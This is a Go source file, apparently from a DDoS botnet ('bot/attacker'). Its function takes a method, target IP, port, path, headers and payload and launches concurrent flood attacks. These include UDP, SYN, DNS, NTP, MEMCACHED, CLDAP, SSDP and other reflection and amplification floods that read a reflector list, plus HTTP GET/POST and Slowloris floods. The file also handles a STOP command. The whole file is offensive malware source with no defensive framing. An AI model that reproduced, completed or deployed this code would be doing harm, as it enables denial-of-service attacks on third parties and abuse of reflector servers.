package attacker

import (
	"bot/attacker/attack"
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

// AttackInit Unified function to receive 6 parameters, but handle them based on the attack type
func AttackInit(method string, dstip string, dstport int, path string, header string, payload string) {
	// Reset the stop channel
	attack.ResetStopChannel()

	// Handle STOP command
	if method == "STOP" {
		close(attack.STOP)
		log.Println("Stopped all attacks")
		return
	}

	// Convert method to uppercase to ensure recognition
	method = strings.ToUpper(method)

	// Handle based on attack type
	switch {
	// Layer4 attacks use only the first three parameters
	case isLayer4Attack(method):
		attack4 := attack.Layer4{
			Method:      method,
			DstIP:       dstip,
			DstPort:     dstport,
			ThreadCount: attack.ThreadCount,
			AmpFile:     "serverfile/reflector.txt",
		}

		// Special parameter handling
		if method == "DNS" || method == "DNSA" {
			attack4.Reservedfield = "example.com" // Default domain query
		}

		go attack4.StartAttack()

	// HTTP attacks use all 6 parameters
	case method == "GET" || method == "POST" || method == "CURL" || method == "SLOWLORIS":
		// Parse header and payload as JSON
		headerMap := make(map[string]string)
		if err := json.Unmarshal([]byte(header), &headerMap); err != nil {
			log.Printf("header not set")
		}

		target := formatTarget(dstip, dstport)
		attack7 := attack.HTTP{
			Method:  method,
			Target:  target,
			Path:    path,
			Threads: attack.ThreadCount,
			Header:  headerMap,
			Payload: payload,
		}

		go attack7.HTTPStart()

	default:
		log.Printf("Unknown attack method: %s", method)
	}
}

// isLayer4Attack Determines if the attack is a Layer 4 (network layer) attack
func isLayer4Attack(method string) bool {
	layer4Methods := map[string]bool{
		"UDP":          true,
		"DNS":          true,
		"DNSA":         true,
		"SYN":          true,
		"RDP":          true,
		"CLDAP":        true,
		"MEMCACHED":    true,
		"ARD":          true,
		"NTP":          true,
		"SSDP":         true,
		"CHARGEN":      true,
		"SNMP":         true,
		"QUIC":         true,
		"OPENVPN":      true,
		"TFTP":         true,
		"DNSBOMB":      true,
		"DNSBOOMERANG": true,
	}
	return layer4Methods[method]
}

// formatTarget Constructs the target URL
func formatTarget(dstip string, dstport int) string {
	// Check if the IP is already in URL format
	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
		return dstip
	}

	// Construct a basic HTTP URL
	return fmt.Sprintf("http://%s:%d", dstip, dstport)
}
